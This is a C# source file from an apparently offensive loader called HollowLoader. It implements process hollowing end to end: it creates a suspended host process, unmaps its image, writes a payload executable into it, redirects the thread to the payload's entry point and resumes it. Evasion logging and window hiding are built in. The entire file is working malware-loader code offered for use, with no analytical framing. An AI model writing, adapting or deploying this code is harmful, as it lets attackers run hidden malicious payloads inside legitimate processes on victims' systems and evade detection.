using System;
using System.Runtime.InteropServices;

namespace HollowLoader
{
    /// <summary>
    /// Classic process hollowing:
    ///   CreateProcess(SUSPENDED) -> read PEB.ImageBaseAddress ->
    ///   NtUnmapViewOfSection -> allocate at target base -> write mapped image
    ///   (relocations applied) -> set thread context entry point -> resume.
    /// Memory is committed as RW and hardened to RX after the write completes.
    /// </summary>
    internal static class Hollowing
    {
        internal static bool Run(Win32 api, byte[] rawPe, string targetPath, string targetArgs, bool debug)
        {
            bool is64 = IntPtr.Size == 8;
            PeImage pe = PeImage.Parse(rawPe);
            if (pe == null)
            {
                Evasion.Log(debug, "[hollow] payload is not a valid PE image");
                return false;
            }
            if (pe.Is64Bit != is64)
            {
                Evasion.Log(debug, "[hollow] architecture mismatch: process=" + (is64 ? "x64" : "x86") + " payload=" + (pe.Is64Bit ? "x64" : "x86"));
                return false;
            }

            // 1. Spawn the sacrificial process suspended
            string cmdLine = targetArgs.Length == 0 ? targetPath : targetPath + " " + targetArgs;
            IntPtr si = Win32.AllocStartupInfo();
            uint flags = Native.CREATE_SUSPENDED | (Config.HideWindow ? Native.CREATE_NO_WINDOW : 0);

            Native.PROCESS_INFORMATION pi;
            bool ok = api.CreateProcessW(null, cmdLine, IntPtr.Zero, IntPtr.Zero, false, flags, IntPtr.Zero, null, si, out pi);
            Marshal.FreeHGlobal(si);
            if (!ok)
            {
                Evasion.Log(debug, "[hollow] CreateProcessW failed (0x" + Marshal.GetLastWin32Error().ToString("X8") + ")");
                return false;
            }
            Evasion.Log(debug, "[hollow] spawned " + cmdLine + " pid=" + pi.dwProcessId);

            try
            {
                // 2. Locate the target image base via PEB
                IntPtr peb = ReadPebBase(api, pi.hProcess);
                if (peb == IntPtr.Zero)
                {
                    Evasion.Log(debug, "[hollow] failed to read PEB");
                    return false;
                }
                IntPtr targetBase = ReadRemotePtr(api, pi.hProcess, IntPtr.Add(peb, is64 ? 0x10 : 0x08));
                Evasion.Log(debug, "[hollow] target image base = 0x" + targetBase.ToInt64().ToString("X"));

                // 3. Unmap the original image
                int status = api.NtUnmapViewOfSection(pi.hProcess, targetBase);
                Evasion.Log(debug, "[hollow] NtUnmapViewOfSection status = 0x" + ((uint)status).ToString("X8"));

                // 4. Allocate: preferred = original target base, then payload base, then anywhere
                IntPtr allocBase = api.VirtualAllocEx(pi.hProcess, targetBase, (UIntPtr)pe.SizeOfImage, Native.MEM_COMMIT | Native.MEM_RESERVE, Native.PAGE_READWRITE);
                if (allocBase == IntPtr.Zero)
                    allocBase = api.VirtualAllocEx(pi.hProcess, (IntPtr)pe.ImageBase, (UIntPtr)pe.SizeOfImage, Native.MEM_COMMIT | Native.MEM_RESERVE, Native.PAGE_READWRITE);
                if (allocBase == IntPtr.Zero)
                    allocBase = api.VirtualAllocEx(pi.hProcess, IntPtr.Zero, (UIntPtr)pe.SizeOfImage, Native.MEM_COMMIT | Native.MEM_RESERVE, Native.PAGE_READWRITE);
                if (allocBase == IntPtr.Zero)
                {
                    Evasion.Log(debug, "[hollow] VirtualAllocEx failed");
                    return false;
                }
                Evasion.Log(debug, "[hollow] allocated at 0x" + allocBase.ToInt64().ToString("X") + " size=0x" + pe.SizeOfImage.ToString("X"));

                // 5. Build the mapped image (headers + sections + relocations)
                byte[] image = pe.BuildMappedImage((ulong)allocBase.ToInt64());

                // 6. Write it into the target
                IntPtr written;
                api.WriteProcessMemory(pi.hProcess, allocBase, image, (UIntPtr)image.Length, out written);
                if (written.ToInt64() != image.Length)
                {
                    Evasion.Log(debug, "[hollow] partial write: " + written.ToInt64() + "/" + image.Length);
                    return false;
                }

                // 7. Harden the image to RX
                api.VirtualProtectEx(pi.hProcess, allocBase, (UIntPtr)pe.SizeOfImage, Native.PAGE_EXECUTE_READ, out _);

                // 8. Redirect the suspended thread to the payload entry point
                ulong entry = (ulong)allocBase.ToInt64() + pe.AddressOfEntryPoint;
                IntPtr ctx = Marshal.AllocHGlobal(0x500);
                try
                {
                    Marshal.WriteInt32(ctx, is64 ? 0x30 : 0x00, (int)(is64 ? Native.CONTEXT_FULL_AMD64 : Native.CONTEXT_FULL_I386));
                    if (!api.GetThreadContext(pi.hThread, ctx))
                    {
                        Evasion.Log(debug, "[hollow] GetThreadContext failed");
                        return false;
                    }
                    if (is64)
                        Marshal.WriteInt64(ctx, 0x80, (long)entry); // Rcx
                    else
                        Marshal.WriteInt32(ctx, 0xB0, (int)entry);  // Eax
                    if (!api.SetThreadContext(pi.hThread, ctx))
                    {
                        Evasion.Log(debug, "[hollow] SetThreadContext failed");
                        return false;
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(ctx);
                }

                // 9. Let it run
                api.ResumeThread(pi.hThread);
                Evasion.Log(debug, "[hollow] resumed, entry = 0x" + entry.ToString("X"));
                return true;
            }
            finally
            {
                api.CloseHandle(pi.hThread);
                api.CloseHandle(pi.hProcess);
            }
        }

        private static IntPtr ReadPebBase(Win32 api, IntPtr hProcess)
        {
            IntPtr buffer = Marshal.AllocHGlobal(0x30);
            try
            {
                int retLen;
                int status = api.NtQueryInformationProcess(hProcess, Native.PROCESS_BASIC_INFORMATION_CLASS, buffer, 0x30, out retLen);
                if (status != 0) return IntPtr.Zero;
                return Marshal.ReadIntPtr(buffer, IntPtr.Size == 8 ? 0x08 : 0x04);
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        private static IntPtr ReadRemotePtr(Win32 api, IntPtr hProcess, IntPtr address)
        {
            byte[] buf = new byte[IntPtr.Size];
            IntPtr read;
            if (!api.ReadProcessMemory(hProcess, address, buf, (UIntPtr)buf.Length, out read)) return IntPtr.Zero;
            return IntPtr.Size == 8
                ? (IntPtr)BitConverter.ToInt64(buf, 0)
                : (IntPtr)BitConverter.ToInt32(buf, 0);
        }
    }
}
